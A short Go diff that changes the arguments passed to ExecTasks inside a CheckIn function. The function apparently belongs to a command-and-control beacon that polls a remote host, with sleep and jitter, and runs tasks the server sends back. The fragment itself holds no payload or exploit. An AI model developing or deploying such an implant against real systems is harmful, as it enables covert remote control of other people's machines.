@@ -40,7 +40,7 @@ func CheckIn(rhost string, rport string, uri string, sleep *int, jitter int, lis
 		var taskRequest tasks.TaskRequestFromServer
 		json.Unmarshal(bBody, &taskRequest)
 
-		ExecTasks(taskRequest.Tasks, url, sleep, agentid, useragent, key, beacon_name)
+		ExecTasks(taskRequest.Tasks, sleep, agentid, useragent, key, beacon_name, rhost, url)
 	}
 
 	return nil
